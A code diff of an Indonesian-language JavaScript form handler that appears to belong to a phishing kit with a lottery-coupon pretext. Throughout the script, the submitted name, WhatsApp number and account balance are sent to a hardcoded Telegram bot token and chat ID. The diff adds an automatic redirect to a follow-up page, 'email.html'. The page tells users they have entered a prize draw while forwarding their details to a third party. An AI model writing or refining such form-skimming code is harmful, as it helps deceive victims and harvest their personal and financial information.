@@ -1,7 +1,7 @@
-// Script untuk menggantikan satu.php (versi JS dengan kirim ke Telegram)
+// script.js - Handle form submit, kirim ke Telegram, dan redirect
 $(document).ready(function() {
     $('#formData').on('submit', function(e) {
-        e.preventDefault(); // Mencegah submit default ke satu.php
+        e.preventDefault(); // Cegah submit default ke action form
 
         // Ambil data dari form
         var nama = $('#namalengkap').val().trim();
@@ -20,7 +20,7 @@ $(document).ready(function() {
             saldo = formatRupiah(saldo);
         }
 
-        // Simpan data ke localStorage (sebagai contoh penyimpanan client-side)
+        // Simpan data ke localStorage
         var dataKupon = {
             nama: nama,
             nowa: nowa,
@@ -31,8 +31,8 @@ $(document).ready(function() {
         localStorage.setItem('kuponData', JSON.stringify(dataKupon));
 
         // Kirim data ke Telegram via Bot API
-        var botToken = '8260302249:AAG8Gjw6PkPt9zSWQQ9mIme8hRtjQvr7BQk';  // Ganti dengan token bot Anda dari BotFather
-        var chatId = '5529657606';       // Ganti dengan chat ID (misalnya, 123456789 untuk pribadi)
+        var botToken = '8260302249:AAG8Gjw6PkPt9zSWQQ9mIme8hRtjQvr7BQk';  // Ganti dengan token bot Anda
+        var chatId = '5529657606';       // Ganti dengan chat ID Anda
         var message = `🎉 Kupon Baru Dicetak!\n\n` +
                       `Nama: ${nama}\n` +
                       `No. WhatsApp: ${nowa}\n` +
@@ -46,25 +46,31 @@ $(document).ready(function() {
             body: JSON.stringify({
                 chat_id: chatId,
                 text: message,
-                parse_mode: 'Markdown'  // Opsional: Untuk format teks (bold, dll.)
+                parse_mode: 'Markdown'
             })
         })
         .then(response => response.json())
         .then(data => {
+            console.log('Response Telegram:', data);  // Debug: Lihat di console
             if (data.ok) {
-                console.log('Pesan dikirim ke Telegram:', data);
                 alert('Kupon berhasil dicetak dan dikirim ke Telegram!');
+                // Redirect otomatis ke halaman kedua setelah sukses
+                window.location.href = 'email.html';  // Ganti dengan URL halaman kedua Anda
             } else {
                 console.error('Error Telegram:', data);
-                alert('Gagal mengirim ke Telegram. Periksa token dan chat ID.');
+                alert('Gagal mengirim ke Telegram: ' + data.description);
+                // Opsional: Tetap redirect jika mau, uncomment baris di bawah
+                // window.location.href = 'email.html';
             }
         })
         .catch(error => {
-            console.error('Error fetch:', error);
+            console.error('Fetch error:', error);
             alert('Error jaringan. Coba lagi.');
+            // Opsional: Tetap redirect jika mau, uncomment baris di bawah
+            // window.location.href = 'email.html';
         });
 
-        // Simulasi cetak kupon (tampilkan di halaman)
+        // Simulasi cetak kupon (tampilkan di halaman sebelum redirect)
         var kuponHTML = `
             <div style="text-align: center; margin-top: 20px; padding: 20px; border: 1px solid #ccc; background: #f9f9f9;">
                 <h3>Kupon Anda Telah Dicetak!</h3>
@@ -72,15 +78,19 @@ $(document).ready(function() {
                 <p><strong>No. WhatsApp:</strong> ${nowa}</p>
                 <p><strong>Saldo Akhir:</strong> ${saldo}</p>
                 <p><strong>Kupon:</strong> ${kupon}</p>
-                <p>Selamat! Anda berhak mengikuti undian. Data juga dikirim ke Telegram.</p>
+                <p>Mengalihkan ke halaman berikutnya...</p>
             </div>
         `;
-        $('.coverform').after(kuponHTML); // Tambahkan setelah form
+        $('.coverform').after(kuponHTML);
 
         // Reset form
         $('#formData')[0].reset();
 
-        // Log ke console untuk debugging
         console.log('Data Kupon:', dataKupon);
     });
+
+    // Error handling global
+    window.onerror = function(msg, url, line) {
+        console.error('Error JS: ' + msg + ' at ' + url + ':' + line);
+    };
 });
